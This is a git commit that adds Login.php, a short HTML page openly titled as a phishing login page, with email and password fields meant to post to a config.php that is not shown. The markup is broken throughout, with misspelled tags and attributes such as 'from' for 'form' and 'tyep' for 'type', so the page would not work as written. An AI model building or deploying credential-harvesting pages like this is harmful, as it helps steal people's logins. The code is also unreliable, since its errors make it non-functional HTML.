cc475ef70fdf7524d4de1ca9591aa59662ba8538
AlonKrekerNe <80860002+AlonKrekerNe@users.noreply.github.com>
2021-03-18 00:15:50 +0100

    Create Login.php

---
+++ Login.php
@@ -0,0 +1,15 @@
+<html>
+<head>
+<link rel="stylesheet" href="style.css">
+<title>HACKER| LOGIN PHISING</title>
+</head>
+<body>
+<div>
+<from action="config.php">
+<p>Email:</p><input tyep="Email" name="email" autoconpleted="off"></input>
+<p>Password:</p><input tyep="pass" name="Password" autoconpleted="off"></input>
+<button tyep="submit" valies="Login">Login</button>
+</from>
+</div>
+</body>
+</html>
